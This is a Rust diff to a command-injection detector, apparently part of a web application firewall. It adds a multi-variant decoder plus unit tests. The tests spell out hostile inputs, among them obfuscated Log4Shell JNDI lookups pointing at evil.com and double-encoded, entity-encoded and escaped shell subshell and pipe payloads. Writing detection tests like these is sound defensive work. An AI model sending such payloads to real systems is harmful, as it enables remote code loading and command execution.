@@ -118,19 +118,27 @@ impl Detector for CommandInjectionDetector {
     fn inspect(&self, req: &RequestView<'_>) -> Vec<Signal> {
         let mut signals = Vec::new();
 
-        // URI surface — both raw and url-decoded so %-encoded
-        // payloads (e.g. `%24%28id%29` for `$(id)`) match too.
+        // S1 (2026-05-18) — multi-variant decoder. Catches
+        // `%2524%2528id%2529` (double-encoded `$(id)`), entity-
+        // encoded `&dollar;(id)`, and unicode-escape forms in
+        // addition to the previous single-pass URL decode.
         let raw_uri = req.uri.to_string();
-        let decoded_uri = super::url_decode(&raw_uri);
-        check(&raw_uri, "uri", &mut signals);
-        check(&decoded_uri, "uri", &mut signals);
+        for variant in super::normalize_for_detection(&raw_uri) {
+            check(&variant, "uri", &mut signals);
+            if !signals.is_empty() {
+                break;
+            }
+        }
 
-        // Body — first 8 KiB, decoded.
+        // Body — first 8 KiB.
         let body = std::str::from_utf8(req.body.peek(8192)).unwrap_or("");
-        if !body.is_empty() {
-            let decoded_body = super::url_decode(body);
-            check(body, "body", &mut signals);
-            check(&decoded_body, "body", &mut signals);
+        if !body.is_empty() && signals.is_empty() {
+            for variant in super::normalize_for_detection(body) {
+                check(&variant, "body", &mut signals);
+                if !signals.is_empty() {
+                    break;
+                }
+            }
         }
 
         // 2026-05-08 GAP-008 — Log4Shell payloads frequently
@@ -345,6 +353,13 @@ mod tests {
         "/?x=${${lower:j}ndi:rmi://evil.com/a}");
     positive!(log4shell_env_lookup,
         "/?x=${${env:HOME:-j}ndi:rmi://evil.com/a}");
+
+    // S1 (2026-05-18) — decoder-evasion positives.
+    // Double URL-encoded $(id) and entity-encoded subshell forms.
+    positive!(cmdi_double_url_encoded_subshell, "/api?x=test%253B%2524%2528id%2529");
+    positive!(cmdi_html_entity_semi_dollar,     "/api?x=test&semi;&dollar;(id)");
+    positive!(cmdi_unicode_escape_subshell,     "/api?x=test\\u003B\\u0024(id)");
+    positive!(cmdi_hex_escape_pipe,             "/api?x=test\\x7Cwhoami");
 
     // Verify the score is 60 (not 50) for Log4Shell hits.
     #[test]
